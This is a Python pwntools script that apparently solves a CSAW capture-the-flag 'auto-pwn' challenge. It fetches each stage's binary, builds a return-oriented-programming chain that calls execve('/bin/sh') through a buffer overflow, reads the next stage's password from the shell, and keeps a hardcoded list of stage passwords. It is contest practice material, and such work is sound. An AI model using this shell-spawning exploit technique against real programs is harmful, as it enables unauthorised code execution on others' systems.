from pwn import *
import sys


def get_conn(num, passw):

	if not args.LOCAL:
		host = 'auto-pwn.chal.csaw.io'
		port = 11000 + num
		p = remote(host, port)
	else:
		os.chdir('./hexdumps')
		p = process(f'../binaries/chall{num}')
		os.chdir('..')

	payload = passw.encode()
	p.sendline(payload)
	
	return p

def get_binary(num, passw):
	p = get_conn(num, passw)
	
	line = b''
	while not line.startswith(b'-----'):
		line = p.recvline()

	file = f'hexdumps/binary_{num}.txt'
	fp = open(file, 'wb')
	line = p.recvline()
	while not line.startswith(b'-----'):
		fp.write(line)
		line = p.recvline()

	fp.close()
	p.close()
	os.system(f'xxd -r {file} binaries/chall{num}')
	os.system(f'ROPgadget --binary binaries/chall{num} > gadgets/gadgets{num}.txt')


def load_gadgets(num, offset):
	with open(f'gadgets/gadgets{num}.txt', 'r') as fp:
		lines = [l.strip() for l in fp if l.startswith('0x')]

	gadgets = {}
	for l in lines:
		addr, gadget = l.split(' : ')
		addr = int(addr[2:], 16) + offset
		gadget = gadget.split(' ; ')
		gadgets[gadget[0]] = addr

	return gadgets



def exec_chall(num, passw):
	p = get_conn(num, passw)
	p.recvuntil(b'Main is at ')
	p.recvuntil(b'Main is at ')
	main = int(p.recvline().strip().decode(), 16)

	elf_path = f'binaries/chall{num}'
	elf = ELF(elf_path)
	elf.address = main - elf.symbols['main']
	gadgets = load_gadgets(num, elf.address)
	log.info(f'main: {hex(main)}')

	offset = 9
	bss = elf.bss()
	mov_rdx_eax = gadgets['mov dword ptr [rdx], eax']
	payload = b'A' * offset
	
	payload += p64(gadgets['pop rax'])
	payload += b'/sh\x00' + 4 * b'\x00'
	payload += p64(gadgets['pop rdx'])
	payload += p64(bss + 4)
	payload += p64(mov_rdx_eax)

	payload += p64(gadgets['pop rax'])
	payload += b'/bin' + 4 * b'\x00'
	payload += p64(gadgets['pop rdx'])
	payload += p64(bss)
	payload += p64(mov_rdx_eax)

	payload += p64(gadgets['pop rdi'])
	payload += p64(bss)
	payload += p64(gadgets['pop rsi'])
	payload += p64(0x0)
	payload += p64(gadgets['pop rdx'])
	payload += p64(0x0)
	payload += p64(gadgets['pop rax'])
	payload += p64(0x3b)

	payload += p64(gadgets['syscall'])
	payload += p64(gadgets['ret'])
	p.sendline(payload)

	# payload = b'A' * offset
	# payload += p64(gadgets['pop rdi'])
	# payload += p64(elf.got[func])
	# payload += p64(elf.plt['puts'])
	# payload += p64(elf.symbols['runChallenge'])

	# leak = u64(p.recvline().strip().ljust(8, b'\x00'))
	# log.info(f'Leaked {func}: {hex(leak)}')
	# libc.address = leak - libc.symbols[func]
	# binsh = next(libc.search(b'/bin/sh'))

	# payload = b'A' * offset
	# payload += p64(gadgets['ret'])
	# payload += p64(gadgets['pop rdi'])
	# payload += p64(binsh)
	# payload += p64(libc.symbols['system'])
	# p.sendline(payload)

	# p.interactive()

	p.sendline(b'cat message.txt')
	p.recvuntil(b'password ')
	r = p.recvline().decode().strip()
	p.close()
	return r

passwords = [
	'8d16635db965bc4e0a97521e8105fad2', 
	'5ba73db3117a885aaa3c80ebe4ec603e', 
	'd4e32a79d4597bb10a5ba69aaf8689e3', 
	'6a4075dc8cd20edc6146f91b7e42684c', 
	'05d618e1dc560b4a84c3371525c7e2d1', 
	'd2f5718673f78494d2d172b1fe9e5d6c', 
	'1eb2463f80b9b81f868007d49479b8b8', 
	'942bf6a59242d014736e056aa9b5a61f', 
	'930f8b14dc3a2c7645bc572920469fe6', 
	'ba41eaf361c65c536c4780f86b886003', 
	'd38caab88089f49fec5a483804407b60', 
	'd0e4746d3ae45cfad33552dd36b4e194', 
	'e042a30077c6bc66146838f7b00506e3', 
	'007e5be15fbbead1ffb6d388e827c23a', 
	'2e0427a53d33dc48e3e3856552328265', 
	'836e8564c5d94de7c61cff04e8b027c4', 
	'551d8e3265626d426fb79174c9f9312b', 
	'0ddded9a55029fdc68a9c4b0b3b949d9', 
	'e8003fc36aa0b5abbf48d5b764de9080',
	'0e66a25c5002764ccf67139a851d0cb8',
	'13462b403d91edd8c8389517c1eca3ed',
]

try:
	for num in range(len(passwords), 50):
		passw = passwords[num - 1]
		if not args.LOCAL:
			get_binary(num, passw)
		nxt_pass = exec_chall(num, passw)
		print(num + 1, nxt_pass)
		passwords.append(nxt_pass)
except Exception as e:
	raise e
finally:
	print(passwords)

